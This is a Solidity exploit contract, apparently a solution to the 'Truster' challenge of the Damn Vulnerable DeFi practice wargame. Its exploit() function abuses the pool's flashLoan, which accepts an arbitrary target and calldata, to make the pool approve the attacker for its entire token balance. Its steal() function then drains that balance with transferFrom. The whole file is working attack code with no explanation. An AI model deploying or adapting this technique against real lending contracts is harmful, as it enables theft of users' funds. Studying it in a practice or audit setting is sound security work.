pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@nomiclabs/buidler/console.sol";


interface ITrusterLenderePool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
    external;
}

contract TrusterExploit {
    IERC20 public damnValuableToken;

    constructor(address _damnValuableToken) public {
        damnValuableToken = IERC20(_damnValuableToken);
    }
    
    function exploit(
        address trusterPool
    ) external {
        uint256 poolBalance = damnValuableToken.balanceOf(trusterPool);
        address exploitAddress = address(this);
        bytes memory encodedApprove = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        ITrusterLenderePool(trusterPool).flashLoan(0, address(this), address(damnValuableToken), encodedApprove);
    }

    function steal(address trusterPool) external {
        uint256 poolBalance = damnValuableToken.balanceOf(trusterPool);
        damnValuableToken.transferFrom(trusterPool, msg.sender, poolBalance);
    }
}